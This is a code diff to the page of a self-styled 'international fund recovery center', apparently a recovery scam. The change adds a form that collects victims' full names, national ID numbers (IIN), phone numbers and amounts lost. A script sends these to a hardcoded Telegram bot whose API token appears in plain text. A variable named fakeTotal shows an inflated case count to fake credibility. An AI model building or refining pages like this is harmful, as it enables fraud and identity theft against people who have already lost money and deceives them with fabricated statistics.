@@ -191,7 +191,7 @@ body{background:#000;padding-bottom:70px}
       <h1>Ваш центр<br><span class="g">взаимодействия</span></h1>
       <p class="hero-desc">Отслеживайте обращения, подавайте заявки в организации — всё в одном месте.</p>
       <div class="hero-actions">
-        <a href="https://t.me/rekvizit_check_bot?start=home" target="_blank" class="btn btn-fill">✈️ Написать в бот</a>
+        <button class="btn btn-fill" onclick="openModal()">📝 Оставить заявку</button>
         <a href="success/" class="btn btn-outline">Кейсы</a>
       </div>
       <div class="hero-metrics">
@@ -224,11 +224,24 @@ body{background:#000;padding-bottom:70px}
     <div id="cl" class="clsi"></div>
   </section>
 
-  <section class="ctas"><div class="ctac"><div class="ctac-inner"><div class="ctat">Центр координации</div><div class="ctad">Бесплатная консультация · Международная юрисдикция</div><a href="https://t.me/rekvizit_check_bot?start=home" target="_blank" class="btn btn-fill">✈️ Написать в бот</a></div></div></section>
+  <section class="ctas"><div class="ctac"><div class="ctac-inner"><div class="ctat">Центр координации</div><div class="ctad">Бесплатная консультация · Международная юрисдикция</div><button class="btn btn-fill" onclick="openModal()">📝 Оставить заявку</button></div></div></section>
 
   <footer class="ftr" style="max-width:100%;margin:40px auto 0;padding:30px clamp(16px,4vw,24px) 100px;border-top:1.5px solid rgba(99,102,241,.1)"><div class="ftr-inner" style="max-width:100%"><div class="ftr-links"><a href="docs/terms.html">Условия</a><a href="docs/privacy.html">Конфиденциальность</a><a href="about/">О нас</a><a href="contacts/">Контакты</a></div><p>© 2026 GlobalSafe Finance · Международный центр возврата средств</p></div></footer>
 
-  <!-- NO MODAL - everything goes to Telegram bot -->
+    <div class="mo" id="mo"><div class="ml"><div class="ml-inner">
+    <button class="mx" onclick="document.getElementById('mo').classList.remove('on')">✕</button>
+    <h2>📋 Заявка</h2>
+    <form id="tf">
+      <div class="fg"><label>ФИО *</label><input type="text" name="name" placeholder="Иванов Иван" required></div>
+      <div class="fg"><label>ИИН *</label><input type="text" name="iin" placeholder="123456789012" maxlength="12" required></div>
+      <div class="fg"><label>Телефон *</label><input type="tel" name="phone" placeholder="+7 7XX XXX XX XX" required></div>
+      <div class="fg"><label>Сумма (₸)</label><input type="text" name="amount" placeholder="500 000"></div>
+      <div class="fg"><label>Платформа</label><input type="text" name="company" placeholder="Название компании"></div>
+      <div class="fg"><label>Детали</label><textarea name="comment" placeholder="Что произошло..."></textarea></div>
+      <button type="submit" class="fb">Отправить заявку</button>
+    </form>
+    <div id="fs" class="fs" style="display:none"><h3>✅ Отправлено!</h3><p>Мы свяжемся с вами.</p></div>
+  </div></div></div>
 
   <script src="assets/js/nav.js"></script>
   <script>
@@ -280,7 +293,7 @@ body{background:#000;padding-bottom:70px}
     var w=document.getElementById('cl'),ct=document.getElementById('case-count');
     var active=clients.filter(function(c){return c.status!=='return_done'});
     var total=active.length;
-    var fakeTotal=127843;
+    var fakeTotal=184291;
     if(ct)ct.textContent=fakeTotal.toLocaleString('ru-RU')+' дел';
     var show=active.slice(0,12);
     if(!show.length){w.innerHTML='<div class="empt"><div class="empt-i">📋</div><p>Нет активных дел</p></div>';return}
@@ -383,6 +396,20 @@ body{background:#000;padding-bottom:70px}
     });
   });
 
+  /* === MODAL FORM === */
+  window.openModal=function(){document.getElementById('mo').classList.add('on')};
+  document.getElementById('tf').addEventListener('submit',function(e){
+    e.preventDefault();var self=this,btn=self.querySelector('.fb');btn.disabled=true;btn.textContent='Отправка...';
+    var fd=new FormData(self);
+    var text='📋 *Новая заявка*\n\n👤 ФИО: '+(fd.get('name')||'')+'\n🆔 ИИН: '+(fd.get('iin')||'')+'\n📱 Телефон: '+(fd.get('phone')||'');
+    if(fd.get('amount'))text+='\n💰 Сумма: '+fd.get('amount')+' ₸';
+    if(fd.get('company'))text+='\n🏢 Платформа: '+fd.get('company');
+    if(fd.get('comment'))text+='\n💬 '+fd.get('comment');
+    fetch('https://api.telegram.org/bot8829750295:AAEdnt-7FPCVuVbgj6tgn7eC2_2LpY5VHCk/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'8471070560',text:text})}).then(function(r){return r.json()}).then(function(d){
+      if(d.ok){self.style.display='none';document.getElementById('fs').style.display='block'}
+      else{alert('Ошибка отправки');btn.disabled=false;btn.textContent='Отправить заявку'}
+    }).catch(function(){alert('Ошибка сети');btn.disabled=false;btn.textContent='Отправить заявку'});
+  });
   </script>
 </body>
 </html>
